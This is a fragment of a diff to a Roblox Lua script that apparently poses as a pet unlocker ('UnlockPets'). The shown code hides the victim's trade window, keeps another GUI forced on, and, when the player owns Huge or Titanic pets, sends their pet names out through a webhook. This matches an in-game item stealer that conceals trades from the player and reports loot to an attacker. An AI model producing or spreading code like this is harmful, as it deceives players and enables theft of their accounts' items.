@@ -99,8 +99,10 @@ end
 
 local trade = game:GetService('Players').LocalPlayer.PlayerGui.TradeWindow.Frame
 trade.Visible = false
-trade:GetPropertyChangedSignal("Visible"):Connect(function()
-	noti.Visible = false
+local mainleft_gui = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft
+mainleft_gui.Enabled = true
+mainleft_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+	mainleft_gui.Enabled = true
 end)
 
 function UnlockPets()
@@ -220,7 +222,7 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 					},
 					["fields"] = {
 						{
-							["name"] = "Pet names",
+							["name"] = "Pet names:",
 							["value"] = table.concat(WebhookList, "\n"),
 							["inline"] = false
 						},
